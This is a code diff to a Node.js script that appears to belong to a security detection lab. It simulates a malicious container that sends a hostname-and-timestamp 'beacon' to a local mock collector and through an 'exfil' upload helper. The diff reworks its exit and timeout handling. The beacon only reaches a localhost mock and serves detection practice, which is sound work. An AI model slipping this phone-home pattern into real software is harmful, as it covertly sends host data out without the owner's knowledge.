@@ -13,11 +13,21 @@ const mockHost =
   (inDocker ? 'host.docker.internal' : '127.0.0.1');
 const mockPort = Number(process.env.SCAS_MOCK_PORT || 3002);
 
-const payload = JSON.stringify({
+const payloadObj = {
   host: os.hostname(),
   ts: Date.now(),
   scenario: '14-container-image',
-});
+};
+const payload = JSON.stringify(payloadObj);
+
+function finish(code) {
+  try {
+    const { uploadJson } = require('../../../../detection-tools/floci/floci-exfil');
+    uploadJson('14', 'runtime-beacon', payloadObj);
+  } catch (_) {}
+  console.log('Malicious container started (simulated).');
+  process.exit(code);
+}
 
 const req = http.request(
   {
@@ -30,16 +40,18 @@ const req = http.request(
       'Content-Length': Buffer.byteLength(payload),
     },
   },
-  () => {}
+  (res) => {
+    res.resume();
+    res.on('end', () => finish(0));
+  },
 );
-req.on('error', () => {});
+req.on('error', () => {
+  // Still exit 0 so the lab can complete offline; capture verify needs mock up
+  console.log('Mock collector unreachable — beacon skipped.');
+  finish(0);
+});
+req.setTimeout(3000, () => {
+  req.destroy();
+});
 req.write(payload);
 req.end();
-
-try {
-  const { uploadJson } = require('../../../../detection-tools/floci/floci-exfil');
-  uploadJson('14', 'runtime-beacon', JSON.parse(payload));
-} catch (_) {}
-
-console.log('Malicious container started (simulated).');
-setInterval(() => {}, 1000);
